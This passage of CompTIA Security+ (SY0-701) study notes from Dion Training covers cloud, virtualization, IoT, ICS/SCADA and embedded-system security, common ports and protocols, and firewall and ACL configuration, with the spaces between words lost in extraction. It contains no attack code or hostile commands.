+scenario○ TabletopExercises■ Scenario-baseddiscussionamongkeystakeholders■ Assessandimproveanorganization'spreparednessandresponse■ Nodeploymentofactualresources■ Identifiesgapsandseamsinresponseplans■ Promotesteam-buildingamongstakeholders
+
+182https://www.DionTraining.com
+
+## Page 183
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Low-costandengagingforparticipants○ FailoverTests■ Controlledexperimentfortransitioningfromprimarytobackupcomponents■ Ensuresuninterruptedfunctionalityduringdisasters■ Requiresmoreresourcesandtime■ Validatestheeffectivenessofdisasterrecoveryplans■ Canidentifyandrectifyissuesinthefailoverprocess○ Simulations■ Computer-generatedrepresentationofareal-worldscenario■ Allowsforhands-onresponseactionsinavirtualenvironment■ Assessesincidentrespondersandsystemadministratorsinreal-time■ Helpsevaluatereactionsandstaffperformance■ Providesfeedbackforlearningandimprovement○ ParallelProcessing■ Replicatesdataandsystemprocessesontoasecondarysystem■ Runsprimaryandsecondarysystemsconcurrently■ Testsreliabilityandstabilityofthesecondarysetup■ Ensuresnodisruptiontoday-to-dayoperations■ Assessesthesystem'sabilitytohandlemultiplefailurescenariossimultaneously■ UsesofParallelProcessing● ResilienceTesting○ Teststheabilityofthesystemtohandlemultiplefailurescenarios● RecoveryTesting○ Teststheefficiencyofthesystemtorecoverfrommultiplepoints
+
+- ffailure
+183https://www.DionTraining.com
+
+## Page 184
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+SecurityArchitecture
+
+Objectives:● 3.1-Compareandcontrastsecurityimplicationsofdifferentarchitecturemodels● 4.1-Givenascenario,applycommonsecuritytechniquestocomputingresources
+
+● SecurityArchitecture○ SecurityArchitecture■ Design,structure,andbehaviorofanorganization'sinformationsecurity
+
+environment○ On-Premisevs.CloudDeployment■ On-Premise● Traditionallocalinfrastructuresetup■ Cloud● Deliveryofcomputingservicesovertheinternet○ CloudSecurityConsiderations■ SharedPhysicalServerVulnerabilities■ InadequateVirtualEnvironmentSecurity■ UserAccessManagement■ LackofUp-to-dateSecurityMeasures■ SinglePointofFailure■ WeakAuthenticationandEncryptionPractices■ UnclearPoliciesandDataRemnants
+
+184https://www.DionTraining.com
+
+## Page 185
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ VirtualizationandContainerization■ Differentvirtualizationtypes■ Containerizationbenefitsandrisks■ Vulnerabilitieslikevmescapeandresourcereuse○ ServerlessComputing■ Cloudprovidermanagesserverallocation■ Developersfocussolelyonwritingcode○ MicroservicesArchitecture■ Collectionofsmall,autonomousservices■ Eachperformsaspecificbusinessprocess○ Software-DefinedNetwork(SDN)■ Dynamic,programmaticallyefficientnetworkconfiguration■ Improvesnetworkperformanceandmonitoring○ InfrastructureasCode(IaC)■ Automationofmanagingandprovisioningtechnologystack■ Software-drivensetupinsteadofmanualconfiguration○ Centralizedvs.DecentralizedArchitectures■ Benefitsandrisksofcentralizedanddecentralizedsetups○ InternetofThings(IoT)■ Networkofphysicaldeviceswithsensorsandconnectivity■ Enablesdataexchangeamongconnectedobjects○ ICSandSCADA■ IndustrialControlSystems(ICS)● Forindustrialproduction■ SupervisoryControlandDataAcquisition(SCADA)● SubsetofICS
+
+185https://www.DionTraining.com
+
+## Page 186
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ EmbeddedSystems■ Dedicatedcomputersystemdesignedforspecificfunctions■ Partofacompletedevicesystemwithhardwarecomponents
+
+● On-premiseversustheCloud○ CloudComputing■ Deliveryofcomputingservicesovertheinternet,includingservers,storage,
+
+databases,networking,software,analytics,andintelligence■ Advantages● Fasterinnovation● Flexibleresources● Economiesofscale○ ResponsibilityMatrix■ Outlinesthedivisionofresponsibilitiesbetweenthecloudserviceproviderand
+
+thecustomer○ Third-PartyVendors■ Providesspecializedservicestoenhancefunctionality,security,andefficiencyof
+
+cloudsolutions○ HybridSolutions■ Combinedon-premise,privatecloud,andpubliccloudservices,allowing
+
+workloadflexibility■ Considerations● Sensitivedataisprotected● Regulatoryrequirementsaremet● Systemscancommunicatewitheachother● Thesolutioniscost-effectiveness
+
+186https://www.DionTraining.com
+
+## Page 187
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ On-PremiseSolutions■ Computinginfrastructurephysicallylocatedon-siteatabusiness○ KeyConsiderationsinCloudComputing■ Availability● System'sabilitytobeaccessedwhenneeded■ Resilience● System'sabilitytorecoverfromfailures■ Cost● Considerbothupfrontandlong-termcosts■ Responsiveness● Speedatwhichthesystemcanadapttodemand■ Scalability● System'sabilitytohandleincreasedworkloads■ EaseofDeployment● Cloudservicesareeasiertosetupthanon-premisesolutions■ RiskTransference● Somerisksaretransferredtotheprovider,butcustomersareresponsible
+
+forsecurity■ EaseofRecovery● Cloudservicesoffereasydatarecoveryandbackupsolutions■ PatchAvailability● Providersreleasepatchesforvulnerabilitiesautomatically
+
+■ InabilitytoPatch● Compatibilityissuesorlackofcontrolcanhinderpatching
+
+187https://www.DionTraining.com
+
+## Page 188
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Power● Cloudprovidermanagesinfrastructure,includingpowersupply● Reducescustomercostsandeliminatespowermanagementconcerns■ Compute● Referstocomputationalresources,includingCPUs,memory,andstorage● Cloudprovidersoffervariouscomputeoptionstosuitdifferentneeds○ Remember■ Cloudcomputingoffersflexibility,scalability,andcost-effectiveness■ On-premisesolutionsprovidecontrolandsecuritybutcanbeexpensiveand
+
+challengingtomaintain■ Hybridsolutionsofferflexibilityandcontrolbutrequireconsiderationsof
+
+security,compliance,interoperability,andcost
+
+● CloudSecurity○ SharedPhysicalServerVulnerabilities■ Incloudenvironments,multipleuserssharethesamephysicalserver● Compromiseddatafromoneusercanpotentiallyimpactothersonthe
+
+sameserver■ Mitigation● Implementstrongisolationmechanisms(e.g.,hypervisorprotection,
+
+securemulti-tenancy)● Performregularvulnerabilityscanning,andpatchsecuritygaps○ InadequateVirtualEnvironmentSecurity■ Virtualizationisessentialincloudcomputing● Inadequatesecurityinthevirtualenvironmentcanleadtounauthorized
+
+accessanddatabreaches
+
+188https://www.DionTraining.com
+
+## Page 189
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Mitigation● UsesecureVMtemplates● RegularlyupdateandpatchVMs● Monitorforunusualactivities● EmploynetworksegmentationtoisolateVMs○ UserAccessManagement■ Weakuseraccessmanagementcanresultinunauthorizedaccesstosensitive
+
+dataandsystems■ Mitigation● Enforcestrongpasswordpolicies● Implementmulti-factorauthentication● Limituserpermissions(PrincipleofLeastPrivilege)● Monitoruseractivitiesforsuspiciousbehavior○ LackofUp-to-dateSecurityMeasures■ Cloudenvironmentsaredynamicandrequireup-to-datesecuritymeasures● Failuretoupdatecanleavesystemsvulnerabletonewthreats■ Mitigation● Regularlyupdateandpatchsoftwareandsystems● Reviewandupdatesecuritypolicies● Stayinformedaboutthelatestthreatsandbestpractices○ SinglePointofFailure■ Cloudservicesrelyingonspecificresourcesorprocessescanleadtosystem-wide
+
+- utagesiftheyfail■ Mitigation● Implementredundancyandfailoverprocedures● Usemultipleservers,datacenters,orcloudproviders
+189https://www.DionTraining.com
+
+## Page 190
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Regularlytestfailoverprocedures○ WeakAuthenticationandEncryptionPractices■ Weakauthenticationandencryptioncanexposecloudsystemsanddata■ Mitigation● Usemulti-factorauthentication● Strongencryptionalgorithms● Securekeymanagementpractices○ UnclearPolicies■ Unclearsecuritypoliciescanleadtoconfusionandinconsistenciesin
+
+implementingsecuritymeasures■ Mitigation● Developclear,comprehensivesecuritypoliciescoveringdatahandling,
+
+accesscontrol,incidentresponse,andmore● Regularlyreviewandupdatepoliciesandprovideeffective
+
+communicationandtraining○ DataRemnants■ DataRemnants● Residualdataleftbehindafterdeletionorerasureprocesses● Inacloudenvironment,datamaynotbecompletelyremoved,posinga
+
+securityrisk■ Mitigation● Implementsecuredatadeletionprocedures● Usesecuredeletionmethods● Managebackupssecurely● Verifydataremovalafterdeletion○ Rememberthatcloudsecurityisasharedresponsibility
+
+190https://www.DionTraining.com
+
+## Page 191
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● VirtualizationandContainerization○ Virtualization■ Emulatesservers,eachwithitsownOSwithinavirtualmachine○ Containerization■ Lightweightalternative,encapsulatingappswiththeirOSenvironment■ KeyBenefits● EfficiencyandSpeed● Portability● Scalability● Isolation● Consistency○ Hypervisors■ TwoTypesofHypervisors● Type1(BareMetal)○ Runsdirectlyonhardware(e.g.,Hyper-V,XenServer,ESXi)● Type2(Hosted)○ OperateswithinastandardOS(e.g.,VirtualBox,VMware)○ VirtualizationVulnerabilities■ VirtualMachine(VM)Escape● AttackersbreakoutofisolatedVMstoaccessthehypervisor■ PrivilegeElevation● Unauthorizedelevationtohigher-levelusers■ LiveVMMigration● Attackercapturesunencrypteddatabetweenservers
+
+191https://www.DionTraining.com
+
+## Page 192
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ ResourceReuse● Improperclearingofresourcesmayexposesensitivedata○ ContainerizationTechnologies■ Docker,Kubernetes,RedHatOpenShiftarepopularcontainerizationplatforms■ Revolutionizedapplicationdeploymentincloudenvironments○ SecuringVirtualMachines■ RegularlyupdateOS,applications,andapplysecuritypatches■ Installantivirussolutionsandsoftwarefirewalls■ Usestrongpasswordsandimplementsecuritypolicies■ Securethehypervisorwithmanufacturer-releasedpatches■ LimitVMconnectionstophysicalmachinesandisolateinfectedVMs■ DistributeVMsamongmultipleserverstopreventresourceexhaustion■ MonitorVMstoprevent"VirtualizationSprawl”■ EnableencryptionofVMfilesfordatasafetyandconfidentiality
+
+● Serverless○ WhatisServerless?■ Serverlesscomputingdoesn'tmeannoservers;itshiftsservermanagement
+
+awayfromdevelopers■ Reliesoncloudserviceproviderstohandleservermanagement,databases,and
+
+someapplicationlogic■ FunctionsasaService(FaaS)Model● Developerswriteanddeployindividualfunctionstriggeredbyevents○ BenefitsofServerless■ Reducedoperationalcosts● Payonlyforcomputetimeused,nochargeswhencodeisidle
+
+192https://www.DionTraining.com
+
+## Page 193
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Automaticscaling● Cloudproviderscalesresourcesbasedonworkload,ensuringoptimal
+
+capacity■ Focusoncoreproduct● Developerscanconcentrateonapplicationfunctionality,notserver
+
+management■ Fastertimetomarket● Reducedinfrastructureconcernsspeedupapplicationdevelopment○ ChallengesandRisks■ VendorLock-in● Relianceonproprietaryinterfaceslimitsflexibilityandmayincreasecosts■ Immaturityofbestpractices● Serverlessisarelativelynewfield,andbestpracticesarestillevolving○ Notaone-size-fits-allsolution■ Considerthespecificneedsandrequirementsofyourapplication;serverless
+
+introduceschallengeslikeVendorLock-inandserviceproviderdependencies
+
+● Microservices○ Microservices■ Architecturalstyleforbreakingdownlargeapplicationsintosmall,independent
+
+services■ Eachmicroservicerunsauniqueprocessandcommunicatesthrougha
+
+well-defined,lightweightmechanism■ Contrastswithtraditionalmonolithicarchitecture,whereallcomponentsare
+
+interconnected● Eachserviceinthemicroservicearchitectureisself-containedandableto
+
+193https://www.DionTraining.com
+
+## Page 194
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+runindependently○ AdvantagesofMicroservices■ Scalability● Servicescanbescaledindependentlybasedondemand■ Flexibility● Microservicescanusedifferenttechnologiesandbemanagedbydifferent
+
+teams■ Resilience● Isolationreducestheriskofsystem-widefailures■ FasterDeploymentsandUpdates● Independentdeploymentandupdatesallowforagilityandreduced
+
+deploymentrisk○ ChallengesofMicroservices■ Complexity● Managingmultipleservicesinvolvesinter-servicecommunication,data
+
+consistency,anddistributedsystemtesting■ DataManagement● Eachmicroservicecanhaveitsowndatabase,leadingtodataconsistency
+
+challenges■ NetworkLatency● Increasedinter-servicecommunicationcanresultinnetworklatencyand
+
+slowerresponsetimes■ Security● Thedistributednatureofmicroservicesincreasestheattacksurface,
+
+requiringrobustsecuritymeasures
+
+194https://www.DionTraining.com
+
+## Page 195
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● NetworkInfrastructure○ NetworkInfrastructure■ Backboneofmodernorganizations■ Compriseshardware,software,services,andfacilitiesfornetworksupportand
+
+management○ PhysicalSeparation■ Securitymeasurestoprotectsensitiveinformation■ Oftenreferredtoas"AirGapping”■ Isolatesasystembyphysicallydisconnectingitfromallnetworks■ Physicalseparationisoneofthemostsecuremethodsofsecurity,butitisstill
+
+vulnerabletosophisticatedattacks○ LogicalSeparation■ Establishesboundarieswithinanetworktorestrictaccesstocertainareas■ Implementedusingfirewalls,VLANs,andnetworkdevices○ Comparison■ PhysicalSeparation(Air-Gapping)● Highsecurity,completeisolation■ LogicalSeparation● Moreflexible,easiertoimplement● Lesssecureifnotconfiguredproperly
+
+● Software-definedNetwork(SDN)○ Software-DefinedNetwork(SDN)■ Revolutionaryapproachtonetworkmanagement■ Enablesdynamic,programmaticallyefficientnetworkconfiguration■ Improvesnetworkperformanceandmonitoring
+
+195https://www.DionTraining.com
+
+## Page 196
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Reducescomplexityinstaticandinflexiblenetworkarchitectures■ Providesacentralizedviewoftheentirenetwork○ SDNArchitecture■ Decouplesnetworkcontrolandforwardingfunctions■ ThreeDistinctPlanes● DataPlane(ForwardingPlane)○ Responsibleforhandlingdatapackets○ MakesdecisionsbasedonprotocolslikeIPandEthernet○ Concernedwithsendingandreceivingdata● ControlPlane○ Centralizeddecision-makerinSDN○ Dictatestrafficflowacrosstheentirenetwork○ Replacestraditional,distributedroutercontrolplanes○ Increasesnetworkmanageabilityandflexibility● ApplicationPlane○ HostsallnetworkapplicationsthatinteractwiththeSDN
+
+controller○ Applicationsinstructthecontrolleronnetworkmanagement○ Controllermanipulatesthenetworkbasedontheseinstructions
+
+● InfrastructureasCode(IaC)○ InfrastructureasCode(IaC)■ ModernapproachtoITinfrastructuremanagement■ Automatesprovisioningandmanagementthroughcode■ UsedinDevOpsandwithcloudcomputing
+
+196https://www.DionTraining.com
+
+## Page 197
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ IaCMethod■ Developersandopsteamsmanageinfrastructurethroughcode■ Codefilesareversioned,tested,andaudited■ High-levellanguageslikeYAML,JSON,ordomain-specificlanguages(e.g.,HCL)
+
+used■ Idempotenceensuresidenticalenvironments● Idempotence○ Operationconsistentlyproducesthesameresults○ Crucialforconsistencyandreliabilityinmultipleenvironments○ BenefitsofIaC■ SpeedandEfficiency■ ConsistencyandStandardization■ Scalability■ CostSavings■ AuditabilityandCompliance○ Challenges■ LearningCurve● Newskillsandmindsetrequired● Teamslearntowrite,test,andmaintaininfrastructurecode■ Complexity● Infrastructurecodecanbecomecomplex● Mitigatedwithmodularizationanddocumentation■ SecurityRisks● Sensitivedataexposureincodefiles● Insecureconfigurationsmaybeintroduced
+
+197https://www.DionTraining.com
+
+## Page 198
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● CentralizedvsDecentralizedArchitectures○ CentralizedArchitecture■ Allcomputingfunctionsmanagedfromasinglelocationorauthority■ Components● CentralServer● Mainframe● DataCenter■ Dataandapplicationsstoredinoneplace,accessedviaanetwork■ Benefits● EfficiencyandControl○ Highresourcecontrolandefficientresourceallocation● Consistency○ Ensuresuniformandaccuratedataacrosstheorganization● Cost-effective○ Reducedmaintenanceandinfrastructurecosts■ Risks● SinglePointofFailure○ Serverfailurecandisrupttheentirenetwork● ScalabilityIssues○ Strugglestohandlegrowth,leadingtoperformanceproblems
+
+● SecurityRisks○ Attractivetargetsforcybercriminals;compromisedserverrisks
+
+dataandappsecurity○ DecentralizedArchitecture■ Computingfunctionsdistributedacrossmultiplesystemsorlocations
+
+198https://www.DionTraining.com
+
+## Page 199
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Nosinglepointofcontrol;eachnodeoperatesindependently■ Benefits● Resilience○ Cancontinuefunctioningdespiteindividualnodefailures● Scalability○ Easilyscaleswithorganizationgrowthbyaddingnewnodes● Flexibility○ Supportsremoteworkanddistributedteams■ Risks● SecurityRisks○ Vulnerabletosecuritythreats,especiallyinremoteworkscenarios● ManagementChallenges○ Complexmanagement,coordinatingmultiplenodes● DataInconsistency○ Potentialissueswithdataconsistencyandsynchronization○ ConsiderationsforChoosingArchitecture■ Choicedependsontheorganization'sspecificneedsandcontext■ Centralizedsystemsfor● Dataaccuracyandresourcemanagementpriorities■ Decentralizedsystemsfor● Resilience,flexibility,andrapidscalingneeds
+
+● InternetofThings(IoT)○ InternetofThings(IoT)■ Networkofphysicaldeviceswithsensors,software,andconnectivity■ Enablesdataexchangeamongconnectedobjects
+
+199https://www.DionTraining.com
+
+## Page 200
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Hub/ControlSystem■ CentralcomponentconnectingIoTdevices■ Collects,processes,analyzesdata,andsendscommands■ Canbeaphysicaldeviceorsoftwareplatform○ SmartDevices■ Everydayobjectsenhancedwithcomputingandinternetcapabilities■ Senseenvironment,processdata,andperformtasksautonomously○ Wearables■ Subsetofsmartdeviceswornonthebody■ Monitorhealth,providereal-timeinformation,andofferhands-freeinterface○ Sensors■ Detectchangesinenvironment,convertintodata■ Measurevariousparameters(temperature,motion,etc.)■ Enableinteractionandautonomousdecisionsinsmartdevices○ IoTRisks■ WeakDefaultSettings● Commonsecurityrisk● Defaultusernames/passwordsareeasytargetsforhackers● Changingdefaultsuponinstallationisessential■ PoorlyConfiguredNetworkServices● Devicesmayhavevulnerabilitiesduetoopenports,unencrypted
+
+communications● Unnecessaryservicescanincreaseattacksurface● KeepingIoTdevicesonaseparatenetworkisrecommended
+
+200https://www.DionTraining.com
+
+## Page 201
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● ICSandSCADA○ IndustrialControlSystems(ICS)■ Systemsusedtomonitorandcontrolindustrialprocesses,foundinvarious
+
+industrieslikeelectrical,water,oil,gas,anddata■ DistributedControlSystems(DCS)● Usedincontrolproductionsystemswithinasinglelocation■ ProgrammableLogicControllers(PLCs)● Usedtocontrolspecificprocessessuchasassemblylinesandfactories○ SupervisoryControlandDataAcquisition(SCADA)Systems■ TypeofICSdesignedformonitoringandcontrollinggeographicallydispersed
+
+industrialprocesses■ Commoninindustrieslike● Electricpowergeneration,transmission,anddistributionsystems● Watertreatmentanddistributionsystems● Oilandgaspipelinemonitoringandcontrolsystems○ RisksandVulnerabilities■ UnauthorizedAccess● Unauthorizedindividualscanmanipulatesystemoperationswithout
+
+properprotection■ MalwareAttacks● Vulnerabletodisruptivemalwareattacks
+
+■ LackofUpdates● Runningoutdatedsoftwarewithunpatchedvulnerabilities■ PhysicalThreats● Susceptibletodamagetohardwareorinfrastructure
+
+201https://www.DionTraining.com
+
+## Page 202
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ SecuringICSandSCADASystems■ ImplementStrongAccessControls● Strongpasswords● Two-factorauthentication● Limitedaccesstoauthorizedpersonnelonly■ RegularlyUpdateandPatchSystems● Keepsystemsupdatedtoprotectagainstknownvulnerabilities■ UseFirewallandIntrusionDetectionSystems● Detectandpreventunauthorizedaccess■ ConductRegularSecurityAudits● Identifyandaddresspotentialvulnerabilitiesthroughroutine
+
+assessments■ EmployeeTraining● Trainemployeesonsecurityawarenessandresponsetopotentialthreats
+
+● EmbeddedSystems○ EmbeddedSystems■ Specializedcomputingcomponentsdesignedfordedicatedfunctionswithin
+
+largerdevices■ Theyintegratehardwareandmechanicalelementsandareessentialforvarious
+
+daily-usedevices○ Real-TimeOperatingSystem(RTOS)■ Designedforreal-timeapplicationsthatprocessdatawithoutsignificantdelays■ Criticalfortime-sensitiveapplicationslikeflightnavigationandmedical
+
+equipment
+
+202https://www.DionTraining.com
+
+## Page 203
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ RisksandVulnerabilitiesinEmbeddedSystems■ HardwareFailure● Pronetofailureinharshenvironments■ SoftwareBugs● Cancausesystemmalfunctionsandsafetyrisks■ SecurityVulnerabilities● Vulnerabletocyber-attacksandunauthorizedaccess■ OutdatedSystems● Agingsoftwareandhardwarecanbemoresusceptibletoattacks○ KeySecurityStrategiesforEmbeddedSystems■ NetworkSegmentation● Dividethenetworkintosegmentstolimitpotentialdamageincaseofa
+
+breach■ Wrappers(e.g.,IPSec)● Protectdataduringtransferbyhidingdatainterceptionpoints■ FirmwareCodeControl● Managelow-levelsoftwaretomaintainsystemintegrity■ ChallengesinPatching● Updatesfaceoperationalconstraints;OTAupdatesdemandmeticulous
+
+planningandsecuritymeasures○ Over-the-Air(OTA)Updates
+
+■ Patchesaredeliveredandinstalledremotely
+
+203https://www.DionTraining.com
+
+## Page 204
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+SecurityInfrastructure
+
+Objectives:● 3.2-Givenascenario,youmustbeabletoapplysecurityprinciplestosecureenterprise
+
+architecture● 4.5-Givenascenario,youmustbeabletomodifyenterprisecapabilitiestoenhancesecurity
+
+● SecurityInfrastructure○ SecurityInfrastructure■ Encompasseshardware,software,networks,data,andpoliciesworking
+
+cohesivelyforinformationassetsafeguarding○ Firewalls■ Types● WebApplication● UnifiedThreatManagement● Next-generation○ IntrusionDetectionSystems(IDS)andIntrusionPreventionSystems(IPS)■ Mechanisms● Identifyingtrends● Showcasingsignatures○ NetworkAppliances■ Specializedhardwareorsoftwareforspecificnetworkingfunctions■ Functions● LoadBalancing● Proxying
+
+204https://www.DionTraining.com
+
+## Page 205
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Monitoring● SecurityEnforcement○ PortSecurity■ Restrictingandcontrollingnetworkaccess■ Basis● MediaAccessControl(MAC)addresses■ Concepts● 802.1xandEAP○ SecuringNetworkCommunications■ Technologies● VPNs● IPSec● TLS■ Objective● Createasecurebackboneforcommunication○ Software-DefinedWideAreaNetworks(SD-WAN)andSecureAccessServiceEdge(SASE)■ SD-WAN● OptimizeWANconnectionswithsoftware-definedprinciples■ SASE● Cloud-basedserviceintegratingsecurityandwideareanetworking○ InfrastructureConsiderations■ Aspects● Deviceplacement,securityzones,screensubnets,attacksurfaces■ Connectivity● Concernsandconsiderations
+
+205https://www.DionTraining.com
+
+## Page 206
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ DeviceAttributes● Activevs.passive,inlinevs.tapsormonitors■ FailureModeOptions● Fail-openorfail-closedforsecuritydevices○ SelectionofInfrastructureControls■ Choosingcontrolsalignedwithnetworkneeds■ Tailoring● Ensuringrobustsecurityarchitecture
+
+● PortsandProtocols○ Ports■ Logicalcommunicationendpointsonacomputerorserver■ Classifiedaseither● Inbound○ Listeningforconnections● Outbound○ Usedtoconnecttoaserver■ Example● SSHconnectionwithaninboundport22andanoutboundportonthe
+
+client○ PortClassification■ Well-KnownPorts(0-1023)● AssignedbyIANA,commonly-usedprotocols■ RegisteredPorts(1024-49151)● Vendor-specific,registeredwithIANA
+
+206https://www.DionTraining.com
+
+## Page 207
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ DynamicandPrivatePorts(49152-65535)● Temporaryoutboundconnections○ Protocols■ Rulesgoverningdevicecommunicationanddataexchange■ Example● HTTPS(port443)usestheHTTPSprotocolforsecurewebcommunication○ MemorizationTips■ Memorizeforeachport● Portnumber● Defaultprotocol● SupportforTCPorUDP● Basicdescriptionoftheportorprotocol○ ListofPortsandProtocols■ Port21:FTP(FileTransferProtocol)-TCP■ Port22:SSH,SCP,SFTP-TCP■ Port23:Telnet-TCP■ Port25:SMTP(SimpleMailTransferProtocol)-TCP■ Port53:DNS(DomainNameSystem)-TCP/UDP■ Port69:TFTP(TrivialFileTransferProtocol)-UDP■ Port80:HTTP(HypertextTransferProtocol)-TCP■ Port88:Kerberos-UDP■ Port110:POP3(PostOfficeProtocol)-TCP■ Port119:NNTP(NetworkNewsTransferProtocol)-TCP■ Port135:RPC(RemoteProcedureCall)-TCP/UDP■ Ports137,138,139:NetBIOS-TCP/UDP■ Port143:IMAP(InternetMessageAccessProtocol)-TCP
+
+207https://www.DionTraining.com
+
+## Page 208
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Port161:SNMP(SimpleNetworkManagementProtocol)-UDP■ Port162:SNMPTrap-UDP■ Port389:LDAP(LightweightDirectoryAccessProtocol)-TCP■ Port443:HTTPS(HTTPSecure)-TCP■ Port445:SMB(ServerMessageBlock)-TCP■ Ports465,587:SMTPS(SMTPSecure)-TCP■ Port514:Syslog-UDP■ Port636:LDAPS(LDAPSecure)-TCP■ Port993:IMAPS(IMAPoverSSL/TLS)-TCP■ Port995:POP3S(POP3overSSL/TLS)-TCP■ Port1433:MicrosoftSQL-TCP■ Ports1645,1646:RADIUS(RemoteAuthentication)-TCP■ Ports1812,1813:RADIUSUDP-UDP■ Port3389:RDP(RemoteDesktopProtocol)-TCP■ Port6514:SyslogTLS-TCP○ StudyTips■ Createflashcardswithprotocol,port,andconnectiondetails■ Regularlytestyourselftomemorizeportsandprotocols■ Understandingtheseiscrucialforsuccessinexamsrelatedtocybersecurity
+
+● Firewalls○ Firewall■ Anetworksecuritydeviceorsoftwarethatmonitorsandcontrolsnetworktraffic
+
+basedonsecurityrules■ Protectsnetworksfromunauthorizedaccessandpotentialthreats
+
+208https://www.DionTraining.com
+
+## Page 209
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ScreenedSubnet(Dual-homedHost)■ Actsasasecuritybarrierbetweenexternaluntrustednetworksandinternal
+
+trustednetworksusingaprotectedhostwithsecuritymeasureslikea
+
+packet-filteringfirewall○ TypesofFirewalls■ PacketFilteringFirewalls● InspectpacketheadersforIPaddressesandportnumbers● Limitedininspection,operatesatLayer4(TransportLayer)■ StatefulFirewalls● Trackconnectionsandrequests,allowingreturntrafficforoutbound
+
+requests● OperatesatLayer4,withimprovedawarenessofconnectionstate■ ProxyFirewalls● Makeconnectionsonbehalfofendpoints,enhancingsecurity● TwoTypesofProxyFirewalls○ Sessionlayer(Layer5)○ Applicationlayer(Layer7)■ KernelProxyFirewalls● Minimalimpactonnetworkperformance,fullinspectionofpacketsat
+
+everylayer● Placedclosetothesystemtheyprotect○ FirewallEvolutions■ NextGenerationFirewall(NGFW)● Application-aware○ distinguishbetweendifferenttypesoftraffic● Conductdeeppacketinspectionandusesignature-basedintrusion
+
+209https://www.DionTraining.com
+
+## Page 210
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+protection● Operatefastwithinminimalnetworkperformanceimpact● Offerfull-stacktrafficvisibility● Canintegratewithothersecurityproducts○ Canbeaproblemiforganizationsbecomereliantonasingle
+
+vendorduetofirewallconfigurationstailoredtooneproductline■ UnifiedThreatManagement(UTM)Firewall● Combinesmultiplesecurityfunctionsinasingledevice● Functionsincludefirewall,intrusionprevention,antivirus,andmore● Reducesthenumberofdevices● Areasinglepointoffailure● UTMsuseseparateindividualengine○ NGFWusesasingleengine■ WebApplicationFirewall(WAF)● FocusesoninspectingHTTPtraffic● Preventscommonwebapplicationattackslikecross-sitescriptingandSQL
+
+injections● Canbeplaced○ In-line(liveattackprevention)■ Devicesitsbetweenthenetworkfirewallandtheweb
+
+servers○ Outofband(detection)■ Devicereceivesamirroredcopyofwebservertraffic○ LayerbasedFirewalls■ Layer4Firewall● Operatesatthetransportlayer
+
+210https://www.DionTraining.com
+
+## Page 211
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Filterstrafficbasedonportnumbersandprotocoldata■ Layer7Firewall● Operatesattheapplicationlayer● Inspects,filters,andcontrolstrafficbasedoncontentanddata
+
+characteristics
+
+● ConfiguringFirewalls○ FirewallsandAccessControlLists(ACLs)■ Firewalls● DedicateddevicesforusingAccessControlLists(ACLs)toprotect
+
+networks■ AccessControlLists(ACLs)● Essentialforsecuringnetworksfromunwantedtraffic● Consistofpermitanddenystatements,oftenbasedonportnumbers● Rulesetsplacedonfirewalls,routers,andnetworkinfrastructuredevices● Controltheflowoftrafficintoandoutofnetworks● Maydefinequalityofservicelevelsinsidenetworksbutareprimarily
+
+usedfornetworksecurityinfirewalls○ ConfiguringACLs■ Aweb-basedinterfaceoratext-basedcommandlineinterfacecanbeused■ TheorderofACLrulesspecifiestheorderofactionstakenontraffic(top-down)■ Thefirstmatchingruleisexecuted,andnootherACLsarechecked■ Placethemostspecificrulesatthetopandgenericrulesatthebottom■ Somedevicessupportimplieddenyfunctions,whileothersrequirea"denyall"
+
+ruleattheend■ Actionstakenbynetworkdevicesshouldbelogged,includingdenyactions
+
+211https://www.DionTraining.com
+
+## Page 212
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ACLRules■ Madeupofsomekeypiecesofinformationincluding● Typeoftraffic● Sourceoftraffic● Destinationoftraffic● Actiontobetakenagainstthetraffic○ FirewallTypes■ Hardware-BasedFirewall● Adedicatednetworksecuritydevicethatfiltersandcontrolsnetwork
+
+trafficatthehardwarelevel● Commonlyusedtoprotectanentirenetworkorsubnetbyimplementing
+
+ACLsandrules■ Software-BasedFirewall● Afirewallthatrunsasasoftwareapplicationonindividualdevices,such
+
+asworkstations● UtilizesACLsandrulestomanageincomingandoutgoingtraffic,
+
+providingsecurityatthesoftwarelevelonaper-devicebasis○ KeyTakeaway■ FirewallsuseACLstocontrolnetworktraffic,ensuringsecuritybyspecifying
+
+permittedanddeniedactions■ ProperACLconfigurationandruleorderarecrucialforeffectivenetwork
+
+protection
+
+212https://www.DionTraining.com
+
+## Page 213
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
